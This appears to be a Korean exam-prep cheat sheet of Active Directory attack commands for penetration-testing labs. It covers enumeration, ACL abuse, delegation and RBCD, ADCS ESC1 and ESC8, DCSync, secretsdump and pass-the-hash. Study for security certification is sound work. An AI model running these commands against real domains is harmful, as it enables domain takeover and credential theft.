# AD 공격 기법 마스터 레퍼런스 (완전판)

> 시험 AD 세트용. 내가 푼 박스 + 아직 안 한 빈틈(★NEW) 전부 포함. 변수: `DC`(DC IP) `DOMAIN`(예 corp.local) `USER` `PASS` `NThash` `tun0IP` `TARGET`

> ⚠️ **시험 규정 주의**
> 
> - **Responder 포이즈닝(기본 실행) 금지.** 강제인증 캡처는 `impacket-smbserver`로 (포이즈닝 없음). Responder는 `-A`(분석)만.
> - **Golden Ticket / ADCS ESC8(릴레이) / Unconstrained+강제인증**은 고급·지속성 → 시험 핵심은 **ESC1·DCSync·Silver**. 나머지는 보너스.
> - **도구 사전 준비**: certipy·bloodyAD·SharpGPOAbuse·PrintSpoofer·SeRestoreAbuse·Rubeus 등 미리 Kali에 다운로드.
> - msfvenom은 전 머신 OK / Metasploit 모듈·Meterpreter는 1대 제한.

## 0. 열거 (Enumeration)

```bash
#자격증명 없음
nxc smb DC -u '' -p ''
rpcclient -U "" -N DC        # → enumdomusers / querydispinfo
ldapsearch -x -H ldap://DC -s base namingcontexts
enum4linux-ng -A DC
#RID brute (사용자 열거)
nxc smb DC -u guest -p '' --rid-brute
#웹 직원명단 → 사용자 리스트
username-anarchy -i names.txt > users.txt
kerbrute userenum -d DOMAIN --dc DC users.txt
#자격증명 있음
nxc smb DC -u USER -p PASS --users --groups --shares --pass-pol
#BloodHound 수집 → UI서 내 계정 우클릭 "Mark as Owned" → 사전쿼리 활용
bloodhound-python -d DOMAIN -u USER -p PASS -ns DC -c all --dns-tcp
#핵심 사전쿼리: Shortest Path from Owned / to Domain Admins /
#  Find Kerberoastable / AS-REP Roastable / Principals with DCSync Rights
#추가 열거
nxc smb DC -u USER -p PASS --loggedon-users --sessions
setspn -T DOMAIN -Q */*        # SPN(kerberoast 후보) on-host
```


```bash
#쓰기 가능한 SMB 공유에 미끼 심기

#★캡처는 impacket-smbserver (Responder 기본=포이즈닝=시험 금지!)

#랩 한정으로 Responder 쓸 거면 -A(분석) 또는 Responder.conf 포이즈너 Off
```

### SSRF → 강제인증 (Heist)


## 2. ACL / DACL 남용 (BloodHound 엣지 → 기법)

### GenericAll / GenericWrite (Nagoya, Administrator, TheFrizz)

```bash
#User 대상 → 비번 리셋
bloodyAD --host DC -d DOMAIN -u ME -p PASS set password TARGET 'New1!'
net rpc password "TARGET" "New1!" -U "DOMAIN/ME%PASS" -S DC
#Group 대상 → 멤버 추가 (DA면 즉시 승격)
bloodyAD --host DC -d DOMAIN -u ME -p PASS add groupMember "GROUP" ME
net rpc group addmem "Domain Admins" "ME" -U "DOMAIN/ME%PASS" -S DC
#Computer 대상 → RBCD (4번)
#GPO 대상 → 로컬 admin (아래)
```

### GenericWrite on GPO → 로컬 admin (Vault)

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount ME --GPOName "Default Domain Policy"
gpupdate /force
#StandIn 대안
.\StandIn.exe --gpo --filter "Default Domain Policy" --localadmin ME
```

### ForceChangePassword (Nagoya 체인)

```bash
net rpc password "TARGET" "New1!" -U "DOMAIN/ME%PASS" -S DC
bloodyAD --host DC -d DOMAIN -u ME -p PASS set password TARGET 'New1!'
```

### WriteOwner / Owns / AddSelf (자주 나오는 ACL 체인)

```bash
#WriteOwner → 소유권을 나로 → GenericAll 부여 → 악용
bloodyAD --host DC -d DOMAIN -u ME -p PASS set owner TARGET ME
bloodyAD --host DC -d DOMAIN -u ME -p PASS add genericAll TARGET ME
#AddSelf / GenericWrite on Group → 그 그룹에 나 추가
bloodyAD --host DC -d DOMAIN -u ME -p PASS add groupMember "GROUP" ME
#WriteDacl → 대상에 원하는 권한 부여 (dcsync/genericAll 등)
bloodyAD --host DC -d DOMAIN -u ME -p PASS add dcsync ME
```

### ★NEW Shadow Credentials (AddKeyCredentialLink) (Certified, TombWatcher)

```bash
#대상 계정/컴퓨터에 key credential 추가 → PKINIT로 NT해시/TGT
certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET
#수동
pywhisker -d DOMAIN -u USER -p PASS --target TARGET --action add
#→ 나온 pfx로
python3 gettgtpkinit.py -cert-pfx TARGET.pfx DOMAIN/TARGET TARGET.ccache
```

## 3. 위임 (Delegation)

### RBCD (Resource-Based) (Resourced)

```bash
#0) MAQ 확인
nxc ldap DC -u USER -p PASS -M maq
#1) 머신계정 생성
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip DC DOMAIN/USER -hashes :NThash
#2) 위임 설정 (GenericAll on computer 활용)
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write -dc-ip DC DOMAIN/USER -hashes :NThash
#3) S4U로 Administrator 사칭
impacket-getST -spn 'cifs/target.DOMAIN' -impersonate Administrator -dc-ip DC 'DOMAIN/EVIL$:Evil123!'
#4) 티켓 사용
export KRB5CCNAME=Administrator@cifs_target.DOMAIN@DOMAIN.ccache
impacket-psexec -k -no-pass target.DOMAIN
```

### ★NEW Constrained Delegation (Vintage)

```bash
#msDS-AllowedToDelegateTo 걸린 계정을 잡았을 때 → S4U로 허용 서비스에 임의 사용자 사칭
impacket-getST -spn 'cifs/target.DOMAIN' -impersonate Administrator -dc-ip DC DOMAIN/svc_user -hashes :NThash
#찾기: nxc ldap DC -u USER -p PASS --trusted-for-delegation
```

### ★NEW Unconstrained Delegation

```bash
#언커스트레인드 위임 걸린 컴퓨터에 SYSTEM 있을 때 → DC를 강제 인증시켜 DC TGT 캡처
#1) 티켓 모니터
.\Rubeus.exe monitor /interval:5 /nowrap
#2) DC 강제 인증 (PrinterBug / PetitPotam)
python3 printerbug.py DOMAIN/USER:PASS@DC <compromised-host-fqdn>
python3 PetitPotam.py -u USER -p PASS <listener> DC
#3) 캡처한 DC$ TGT → PtT → DCSync
.\Rubeus.exe ptt /ticket:<DC$ TGT>
impacket-secretsdump -k -no-pass DC.DOMAIN -just-dc
```

## 5. ★NEW ADCS (인증서 서비스) (Certified, EscapeTwo, Fluffy)

> 시험 핵심은 **ESC1**. ESC8(릴레이)은 고급·범위 밖 가능성 → 보너스로.

```bash
#취약 템플릿 탐지
certipy find -u USER@DOMAIN -p PASS -dc-ip DC -stdout -vulnerable
#ESC1: SAN에 admin 지정해 인증서 발급 → 인증  ← 시험 관련성 핵심
certipy req -u USER@DOMAIN -p PASS -ca CA-NAME -template VulnTemplate -upn administrator@DOMAIN
certipy auth -pfx administrator.pfx -dc-ip DC      # → NT해시 / TGT
#ESC8(고급): 웹 등록(HTTP)에 NTLM 릴레이 — 릴레이는 포이즈닝과 다름(허용)이나 범위 밖일 수 있음
certipy relay -target 'http://CA-host/certsrv/certfnsh.asp' -template DomainController
```


### ntds.dit 오프라인 덤프 (Resourced)

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

### Pass-the-Hash / Pass-the-Ticket

```bash
evil-winrm -i DC -u USER -H NThash
impacket-psexec -hashes :NThash DOMAIN/Administrator@DC
impacket-wmiexec -hashes :NThash DOMAIN/USER@DC
nxc smb SUBNET -u USER -H NThash --continue-on-success      # 어디서 admin인지
```

### Overpass-the-Hash (해시 → TGT → Kerberos)

```bash
#해시만 있는데 Kerberos(-k)로 붙어야 할 때
impacket-getTGT DOMAIN/USER -hashes :NThash -dc-ip DC
export KRB5CCNAME=USER.ccache
impacket-psexec -k -no-pass target.DOMAIN
.\Rubeus.exe asktgt /user:USER /rc4:NThash /ptt     # on-host
```

### ★ Double-Hop 문제 (WinRM/PSRemoting 함정 — 꼭 알 것)

```
증상: evil-winrm으로 들어간 셸에서 다른 자원(DC/공유)에 인증 시 자격증명이 안 넘어감
      → "Access Denied"인데 자격증명은 맞음. Kerberos 위임 안 되는 구조.
해결:
 1) 평문 비번 있으면 셸 안에서 새 PSCredential 만들어 -Credential 로 실행
    $p=ConvertTo-SecureString 'PASS' -AsPlainText -Force
    $c=New-Object System.Management.Automation.PSCredential('DOMAIN\USER',$p)
    Invoke-Command -ComputerName DC -Credential $c -ScriptBlock {whoami}
 2) 아예 Kerberos 티켓(-k)/PtH로 Kali에서 직접 대상에 붙기 (evil-winrm 안 거치고)
 3) RunasCs / 새 세션으로 자격증명 주입
```
